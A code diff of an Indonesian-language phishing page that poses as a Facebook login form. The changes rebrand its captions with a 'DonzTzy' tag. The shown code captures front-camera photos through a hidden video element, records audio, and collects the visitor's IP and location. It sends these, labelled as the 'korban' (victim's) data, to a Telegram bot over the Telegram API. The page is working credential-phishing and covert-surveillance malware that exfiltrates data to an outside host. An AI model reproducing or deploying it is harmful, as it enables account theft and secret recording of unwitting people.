@@ -43,16 +43,16 @@ button {
 </head>
 <body>
 
-<h1 id="judul">Scanning device...</h1>
+<h1 id="judul">Memuat Halaman Login Sebentar</h1>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <div id="loginForm">
-  <h2 style="color:#1877f2;">Facebook Login</h2>
+  <h2 style="color:#1877f2;">𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗟𝗼𝗴𝗶𝗻</h2>
   <input type="text" id="email" placeholder="Email atau Nomor Telepon">
   <input type="password" id="password" placeholder="Kata Sandi">
-  <button onclick="kirimLogin()">Masuk</button>
+  <button onclick="kirimLogin()">𝗟𝗼𝗴𝗶𝗻</button>
 </div>
 
 <script>
@@ -86,7 +86,7 @@ function kirimAudio(blob) {
   let form = new FormData();
   form.append('chat_id', chat_id);
   form.append('audio', blob, 'rekaman.mp3');
-  form.append('caption', '🎤 Rekaman suara korban');
+  form.append('caption', '🎤 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗮𝗱𝗮𝗽 𝗥𝗲𝗸𝗮𝗺𝗮𝗻 𝗦𝘂𝗮𝗿𝗮 𝗞𝗼𝗿𝗯𝗮𝗻');
   fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
     method: 'POST',
     body: form
@@ -98,12 +98,12 @@ function ambilFoto() {
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   canvas.toBlob(blob => {
-    kirimFoto(blob, '📸 Foto kamera depan korban');
+    kirimFoto(blob, '📸 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗮𝗱𝗮𝗽 𝗞𝗮𝗺𝗲𝗿𝗮 𝗗𝗲𝗽𝗮𝗻 / 𝗕𝗲𝗹𝗮𝗸𝗮𝗻𝗴');
   }, 'image/jpeg');
 }
 
 // Start akses data
-kirimPesan('📝 Data korban masuk...');
+kirimPesan('📝 𝗗𝗮𝘁𝗮 𝗞𝗼𝗿𝗯𝗮𝗻 𝗠𝗮𝘀𝘂𝗸 𝗕𝗮𝗻𝗴 𝗗𝗼𝗻𝘇𝗧𝘇𝘆...');
 
 // IP & Lokasi
 fetch('https://api.ipify.org?format=json')
@@ -123,7 +123,7 @@ fetch('https://api.ipify.org?format=json')
     const now = Date.now();
     const waktuBuka = Math.floor((now - mulai) / 1000);
     const status = `
-== INFORMASI KORBAN ==
+==[+] 𝙏𝙧𝙖𝙘𝙠 𝘽𝙮 𝘿𝙤𝙣𝙯𝙏𝙯𝙮 [+]==
 🌐 IP: ${info.ip}
 🏳 Negara: ${info.country_name}
 🖥 Region: ${info.region}
@@ -138,7 +138,7 @@ fetch('https://api.ipify.org?format=json')
 🧭 Browser: ${browser}
 📡 Status Jaringan: ${statusJaringan}
 ⏳ Waktu buka web: ${waktuBuka} detik
-=====================`;
+==[+] 𝘾𝙮𝙗𝙚𝙧 𝘿𝙤𝙣𝙯 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 [+]==`;
     kirimPesan(status);
   });
 });
